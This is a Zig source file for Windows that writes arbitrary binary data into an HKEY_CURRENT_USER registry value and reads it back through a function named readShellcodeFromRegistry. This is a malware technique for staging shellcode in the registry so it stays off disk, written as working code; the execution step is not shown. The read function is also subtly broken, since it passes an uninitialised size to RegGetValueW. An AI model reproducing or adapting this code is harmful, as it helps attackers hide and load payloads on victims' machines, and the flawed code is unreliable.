const std = @import("std");
const win = @import("zigwin32").everything;

const HANDLE = win.HANDLE;
const HKEY_CURRENT_USER = win.HKEY_CURRENT_USER;
const KEY_SET_VALUE = win.KEY_SET_VALUE;
const KEY_QUERY_VALUE = win.KEY_QUERY_VALUE;
const HKEY = win.HKEY;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const RRF_RT_ANY = win.RRF_RT_ANY;
const INFINITE = win.INFINITE;

const RegOpenKeyExW = win.RegOpenKeyExW;
const RegCloseKey = win.RegCloseKey;
const RegGetValueW = win.RegGetValueW;
const RegQueryValueExW = win.RegQueryValueExW;
const RegSetValueExW = win.RegSetValueExW;

fn writeToRegistry(allocator: std.mem.Allocator, sub_key: []const u8, value_name: []const u8, data: []const u8) !void {
    const sub_key_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, sub_key);
    defer allocator.free(sub_key_utf16);

    const value_name_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, value_name);
    defer allocator.free(value_name_utf16);

    var h_key: ?HKEY = null;
    if (RegOpenKeyExW(
        HKEY_CURRENT_USER,
        sub_key_utf16,
        0,
        KEY_SET_VALUE,
        &h_key,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
        return error.RegOpenKeyExWFailed;
    }
    defer _ = RegCloseKey(h_key);

    if (RegSetValueExW(
        h_key,
        value_name_utf16,
        0,
        .BINARY,
        @ptrCast(data),
        @intCast(data.len),
    ) != .NO_ERROR) {
        std.debug.print("[!] RegSetValueExW Failed\n", .{});
        return error.RegSetValueExWFailed;
    }
}

fn readShellcodeFromRegistry(allocator: std.mem.Allocator, sub_key: []const u8, value_name: []const u8) ![]u8 {
    const sub_key_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, sub_key);
    defer allocator.free(sub_key_utf16);

    const value_name_utf16 = try std.unicode.utf8ToUtf16LeAllocZ(allocator, value_name);
    defer allocator.free(value_name_utf16);

    var h_key: ?HKEY = null;
    if (RegOpenKeyExW(
        HKEY_CURRENT_USER,
        sub_key_utf16,
        0,
        KEY_QUERY_VALUE,
        &h_key,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
        return error.RegOpenKeyExWFailed;
    }
    defer _ = RegCloseKey(h_key);

    var shell_code_size: u32 = undefined;
    if (RegQueryValueExW(
        h_key,
        value_name_utf16,
        null,
        null,
        null,
        &shell_code_size,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegQueryValueExW Failed\n", .{});
        return error.RegQueryValueExWFailed;
    }

    const shell_code = try allocator.alloc(u8, shell_code_size);

    var cb_data: u32 = undefined;
    if (RegGetValueW(
        HKEY_CURRENT_USER,
        sub_key_utf16,
        value_name_utf16,
        RRF_RT_ANY,
        null,
        shell_code.ptr,
        &cb_data,
    ) != .NO_ERROR) {
        std.debug.print("[!] RegGetValueW Failed\n", .{});
        return error.RegGetValueWFailed;
    }

    return shell_code;
}
